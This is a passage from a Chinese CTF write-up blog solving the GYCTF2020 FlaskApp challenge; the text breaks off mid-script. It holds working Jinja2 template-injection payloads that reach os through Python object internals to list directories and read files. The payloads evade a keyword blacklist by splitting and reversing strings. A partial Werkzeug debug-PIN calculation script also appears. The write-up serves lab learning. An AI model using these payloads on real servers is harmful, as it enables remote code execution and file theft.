<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>WEB-BUU第三页 | 墨水彩笔</title><meta name="author" content="墨水彩笔"><meta name="copyright" content="墨水彩笔"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="[GYCTF2020]FlaskApp预备知识 123456__class__         返回调用的参数类型__bases__         返回基类列表 __mro__           此属性是在方法解析期间寻找基类时的参考类元组 __subclasses__()  返回子类的列表 __globals__       以字典的形式返回函数所在的全局命名空间所定义的全局变量，与 fun">
<meta property="og:type" content="article">
<meta property="og:title" content="WEB-BUU第三页">
<meta property="og:url" content="http://example.com/2022/12/18/WEB-BUU%E7%AC%AC%E4%B8%89%E9%A1%B5/index.html">
<meta property="og:site_name" content="墨水彩笔">
<meta property="og:description" content="[GYCTF2020]FlaskApp预备知识 123456__class__         返回调用的参数类型__bases__         返回基类列表 __mro__           此属性是在方法解析期间寻找基类时的参考类元组 __subclasses__()  返回子类的列表 __globals__       以字典的形式返回函数所在的全局命名空间所定义的全局变量，与 fun">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
<meta property="article:published_time" content="2022-12-18T12:38:44.000Z">
<meta property="article:modified_time" content="2023-02-10T12:39:07.917Z">
<meta property="article:author" content="墨水彩笔">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/12/18/WEB-BUU%E7%AC%AC%E4%B8%89%E9%A1%B5/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
  root: '/',
  hexoversion: '5.2.0',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  ClickShowText: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isSidebar: true,
  postUpdate: '2023-02-10 20:39:07'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(function () {
  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }

  const autoChangeMode = 'false'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }
})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">76</div></a></div></div></div><hr/></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#GYCTF2020-FlaskApp"><span class="toc-number">1.</span> <span class="toc-text">[GYCTF2020]FlaskApp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PIN%E7%A0%81"><span class="toc-number">1.1.</span> <span class="toc-text">PIN码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TIPS"><span class="toc-number">1.2.</span> <span class="toc-text">TIPS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME"><span class="toc-number">2.</span> <span class="toc-text">[极客大挑战 2019]RCE ME</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TIPS-1"><span class="toc-number">2.1.</span> <span class="toc-text">TIPS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MRCTF2020-%E5%A5%97%E5%A8%83"><span class="toc-number">3.</span> <span class="toc-text">[MRCTF2020]套娃</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2"><span class="toc-number">4.</span> <span class="toc-text">[WUSTCTF2020]颜值成绩查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FBCTF2019-RCEService"><span class="toc-number">5.</span> <span class="toc-text">[FBCTF2019]RCEService</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">5.1.</span> <span class="toc-text">方法一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A"><span class="toc-number">5.2.</span> <span class="toc-text">方法二：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TIPS-2"><span class="toc-number">5.3.</span> <span class="toc-text">TIPS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Zer0pts2020-Can-you"><span class="toc-number">6.</span> <span class="toc-text">[Zer0pts2020]Can you</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TIPS-3"><span class="toc-number">6.1.</span> <span class="toc-text">TIPS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun"><span class="toc-number">7.</span> <span class="toc-text">[CISCN2019 华北赛区 Day1 Web2]ikun</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TIPS-4"><span class="toc-number">7.1.</span> <span class="toc-text">TIPS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JWT%E4%BC%AA%E9%80%A0"><span class="toc-number">7.1.1.</span> <span class="toc-text">JWT伪造</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Python%E5%AE%A1%E8%AE%A1"><span class="toc-number">7.1.2.</span> <span class="toc-text">Python审计</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSCCTF-2019-Qual-FlaskLight"><span class="toc-number">8.</span> <span class="toc-text">[CSCCTF 2019 Qual]FlaskLight</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TIPS-5"><span class="toc-number">8.1.</span> <span class="toc-text">TIPS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96"><span class="toc-number">9.</span> <span class="toc-text">[GWCTF 2019]枯燥的抽奖</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NCTF2019-True-XML-cookbook"><span class="toc-number">10.</span> <span class="toc-text">[NCTF2019]True XML cookbook</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">10.1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XEETIPS"><span class="toc-number">10.2.</span> <span class="toc-text">XEETIPS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WUSTCTF2020-CV-Maker"><span class="toc-number">11.</span> <span class="toc-text">[WUSTCTF2020]CV Maker</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox"><span class="toc-number">12.</span> <span class="toc-text">[CISCN2019 华北赛区 Day1 Web1]Dropbox</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHAR"><span class="toc-number">12.1.</span> <span class="toc-text">PHAR</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E8%BF%87%E6%BB%A4%E4%BA%86phar%E6%80%8E%E4%B9%88%E5%8A%9E%E5%91%A2%EF%BC%9F"><span class="toc-number">12.1.1.</span> <span class="toc-text">如果过滤了phar怎么办呢？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%86phar%E4%BC%AA%E9%80%A0%E6%88%90%E5%85%B6%E4%BB%96%E6%A0%BC%E5%BC%8F%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">12.1.2.</span> <span class="toc-text">将phar伪造成其他格式的文件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCTF2015-EasySQL"><span class="toc-number">13.</span> <span class="toc-text">[RCTF2015]EasySQL</span></a></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">墨水彩笔</a></span><span id="menus"><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">WEB-BUU第三页</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-12-18T12:38:44.000Z" title="Created 2022-12-18 20:38:44">2022-12-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-02-10T12:39:07.917Z" title="Updated 2023-02-10 20:39:07">2023-02-10</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p>预备知识</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__class__         返回调用的参数类型</span><br><span class="line">__bases__         返回基类列表 </span><br><span class="line">__mro__           此属性是在方法解析期间寻找基类时的参考类元组 </span><br><span class="line">__subclasses__()  返回子类的列表 </span><br><span class="line">__globals__       以字典的形式返回函数所在的全局命名空间所定义的全局变量，与 func_globals 等价 </span><br><span class="line">__builtins__      内建模块的引用，在任何地方都是可见的(包括全局)，每个 Python 脚本都会自动加载，这个模块包括了很多强大的 built-in 函数，例如eval, exec, open等等</span><br></pre></td></tr></table></figure>

<p>发现网站存在SSTI注入，在加密中输入4解密出来的内容是4，但如果是乘法会回显nonono的提示，应该是存在某些过滤</p>
<p>并且在解密中直接输入非base64内容会报错，根据报错的内容可以看到部分源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> @app.route(&#39;&#x2F;decode&#39;,methods&#x3D;[&#39;POST&#39;,&#39;GET&#39;])</span><br><span class="line">def decode():</span><br><span class="line">    if request.values.get(&#39;text&#39;) :</span><br><span class="line">        text &#x3D; request.values.get(&quot;text&quot;)</span><br><span class="line">        text_decode &#x3D; base64.b64decode(text.encode())</span><br><span class="line">        tmp &#x3D; &quot;结果 ： &#123;0&#125;&quot;.format(text_decode.decode())</span><br><span class="line">        if waf(tmp) :</span><br><span class="line">            flash(&quot;no no no !!&quot;)</span><br><span class="line">            return redirect(url_for(&#39;decode&#39;))</span><br><span class="line">        res &#x3D;  render_template_string(tmp)</span><br></pre></td></tr></table></figure>

<p>我想直接利用下面的语句看看有什么可以用的类，但发现不知道是语句问题还是怎么回事用不了</p>
<figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>网上查找下发现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if &quot;warning&quot; in x.__name__ %&#125;</span><br><span class="line">&#123;&#123;x()._module.__builtins__[&#39;__import__&#39;](&#39;os&#39;).popen(request.args.input).read()&#125;&#125;</span><br><span class="line">&#123;%endif%&#125;&#123;%endfor%&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;,&#39;r&#39;).read() &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>查看网页源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app &#x3D; Flask(__name__) </span><br><span class="line">app.config[&#39;SECRET_KEY&#39;] &#x3D; &#39;s_e_c_r_e_t_k_e_y&#39; bootstrap &#x3D; Bootstrap(app) class NameForm(FlaskForm): </span><br><span class="line">	text &#x3D; StringField(&#39;BASE64加密&#39;,validators&#x3D; [DataRequired()]) submit &#x3D; SubmitField(&#39;提交&#39;) class NameForm1(FlaskForm): text &#x3D; StringField(&#39;BASE64解密&#39;,validators&#x3D; [DataRequired()]) submit &#x3D; SubmitField(&#39;提交&#39;) def waf(str): black_list &#x3D; [&amp;#34;flag&amp;#34;,&amp;#34;os&amp;#34;,&amp;#34;system&amp;#34;,&amp;#34;popen&amp;#34;,&amp;#34;import&amp;#34;,&amp;#34;eval&amp;#34;,&amp;#34;chr&amp;#34;,&amp;#34;request&amp;#34;, &amp;#34;subprocess&amp;#34;,&amp;#34;commands&amp;#34;,&amp;#34;socket&amp;#34;,&amp;#34;hex&amp;#34;,&amp;#34;base64&amp;#34;,&amp;#34;*&amp;#34;,&amp;#34;?&amp;#34;] for x in black_list : if x in str.lower() : return 1 @app.route(&#39;&#x2F;hint&#39;,methods&#x3D;[&#39;GET&#39;]) def hint(): txt &#x3D; &amp;#34;失败乃成功之母！！&amp;#34; return render_template(&amp;#34;hint.html&amp;#34;,txt &#x3D; txt) @app.route(&#39;&#x2F;&#39;,methods&#x3D;[&#39;POST&#39;,&#39;GET&#39;]) def encode(): if request.values.get(&#39;text&#39;) : text &#x3D; request.values.get(&amp;#34;text&amp;#34;) text_decode &#x3D; base64.b64encode(text.encode()) tmp &#x3D; &amp;#34;结果 :&#123;0&#125;&amp;#34;.format(str(text_decode.decode())) res &#x3D; render_template_string(tmp) flash(tmp) return redirect(url_for(&#39;encode&#39;)) else : text &#x3D; &amp;#34;&amp;#34; form &#x3D; NameForm(text) return render_template(&amp;#34;index.html&amp;#34;,form &#x3D; form ,method &#x3D; &amp;#34;加密&amp;#34; ,img &#x3D; &amp;#34;flask.png&amp;#34;) @app.route(&#39;&#x2F;decode&#39;,methods&#x3D;[&#39;POST&#39;,&#39;GET&#39;]) def decode(): if request.values.get(&#39;text&#39;) : text &#x3D; request.values.get(&amp;#34;text&amp;#34;) text_decode &#x3D; base64.b64decode(text.encode()) tmp &#x3D; &amp;#34;结果 ： &#123;0&#125;&amp;#34;.format(text_decode.decode()) if waf(tmp) : flash(&amp;#34;no no no !!&amp;#34;) return redirect(url_for(&#39;decode&#39;)) res &#x3D; render_template_string(tmp) flash( res ) return redirect(url_for(&#39;decode&#39;)) else : text &#x3D; &amp;#34;&amp;#34; form &#x3D; NameForm1(text) return render_template(&amp;#34;index.html&amp;#34;,form &#x3D; form, method &#x3D; &amp;#34;解密&amp;#34; , img &#x3D; &amp;#34;flask1.png&amp;#34;) @app.route(&#39;&#x2F;&lt;name&gt;&#39;,methods&#x3D;[&#39;GET&#39;]) def not_found(name): return render_template(&amp;#34;404.html&amp;#34;,name &#x3D; name) if __name__ &#x3D;&#x3D; &#39;__main__&#39;: app.run(host&#x3D;&amp;#34;0.0.0.0&amp;#34;, port&#x3D;5000, debug&#x3D;True)</span><br></pre></td></tr></table></figure>

<p>中间的WAF为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def waf(str): </span><br><span class="line">  black_list &#x3D; [ &amp;</span><br><span class="line">    #34;flag&amp;# 34;, &amp; #34;os&amp;# 34;, &amp; #34;system&amp;# 34;, &amp;</span><br><span class="line">    #34;popen&amp;# 34;, &amp; #34;import&amp;# 34;, &amp; #34;eval&amp;# 34;, &amp;</span><br><span class="line">    #34;chr&amp;# 34;, &amp; #34;request&amp;# 34;, &amp; #34;subprocess&amp;# 34;, &amp;</span><br><span class="line">    #34;commands&amp;# 34;, &amp; #34;socket&amp;# 34;, &amp; #34;hex&amp;# 34;, &amp;</span><br><span class="line">    #34;base64&amp;# 34;, &amp; #34;*&amp;# 34;, &amp; #34;?&amp;# 34;</span><br><span class="line">]</span><br><span class="line">  for x in black_list: </span><br><span class="line">    if x in str.lower(): </span><br><span class="line">      return 1@ app.route( &#39;&#x2F;hint&amp;# 39;, methods &#x3D; [ &amp; #39;GET&amp;# 39;])</span><br></pre></td></tr></table></figure>

<p>过滤了很多关键词，并且进行lower那么就不能用大小写绕过或者base64、hex绕过</p>
<p>可以使用拼接法来绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;&#x2F;&#39;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"> [&#39;bin&#39;, &#39;boot&#39;, &#39;dev&#39;, &#39;etc&#39;, &#39;home&#39;, &#39;lib&#39;, &#39;lib64&#39;, &#39;media&#39;, &#39;mnt&#39;, &#39;opt&#39;, &#39;proc&#39;, &#39;root&#39;, &#39;run&#39;, &#39;sbin&#39;, &#39;srv&#39;, &#39;sys&#39;, &#39;tmp&#39;, &#39;usr&#39;, &#39;var&#39;, &#39;this_is_the_flag.txt&#39;, &#39;.dockerenv&#39;, &#39;app&#39;]</span><br><span class="line"></span><br><span class="line">读取</span><br><span class="line">拼接法</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">	&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;		 &#123;&#123;c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;this_is_the_fl&#39;+&#39;ag.txt&#39;,&#39;r&#39;).read()&#125;&#125;</span><br><span class="line">	&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">倒叙</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;</span><br><span class="line">&#123;&#123;c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;txt.galf_eht_si_siht&#x2F;&#39;[::-1],&#39;r&#39;).read()&#125;&#125;&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>其实这里应该还有另一个方法，因为Hint里面提示还有一个PIN</p>
<h3 id="PIN码"><a href="#PIN码" class="headerlink" title="PIN码"></a>PIN码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">生成PIN的关键值有如下几个</span><br><span class="line"></span><br><span class="line">1.服务器运行flask所登录的用户名。 通过读取&#x2F;etc&#x2F;passwd获得</span><br><span class="line">2.modname 一般不变就是flask.app</span><br><span class="line">3.getattr(app, “name”, app.class.name)。python该值一般为Flask</span><br><span class="line">值一般不变</span><br><span class="line">4.flask库下app.py的绝对路径。通过报错信息就会泄露该值。</span><br><span class="line">5.当前网络的mac地址的十进制数。通过文件&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address获得 &#x2F;&#x2F;eth0处为当前使用的网卡</span><br><span class="line">6.最后一个就是机器的id。 对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在&#x2F;etc&#x2F;machine-id或&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i，有的系统没有这两个文件，windows的id获取跟linux也不同。</span><br><span class="line">对于docker机则读取&#x2F;proc&#x2F;self&#x2F;cgroup：</span><br></pre></td></tr></table></figure>

<p>获取mac地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address&#39;,&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">8a:42:ef:9a:d6:c3</span><br><span class="line">转为十进制</span><br></pre></td></tr></table></figure>

<p>获取机器id</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;proc&#x2F;self&#x2F;cgroup&#39;,&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">32ecf947029d8117da23c97a37efd18fce94189a910d327e4462ea026cbcd376</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line"></span><br><span class="line">probably_public_bits &#x3D; [</span><br><span class="line">    &#39;flaskweb&#39;,  # 服务器运行flask所登录的用户名</span><br><span class="line">    &#39;flask.app&#39;,  # modname</span><br><span class="line">    &#39;Flask&#39;,  # getattr(app, &quot;\_\_name__&quot;, app.\_\_class__.\_\_name__)</span><br><span class="line">    &#39;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;flask&#x2F;app.py&#39;,  # flask库下app.py的绝对路径</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits &#x3D; [</span><br><span class="line">    &#39;152020092376771&#39;,  # 当前网络的mac地址的十进制数</span><br><span class="line">    &#39;32ecf947029d8117da23c97a37efd18fce94189a910d327e4462ea026cbcd376&#39;  # 机器的id</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h &#x3D; hashlib.md5()</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit &#x3D; bit.encode(&#39;utf-8&#39;)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(b&#39;cookiesalt&#39;)</span><br><span 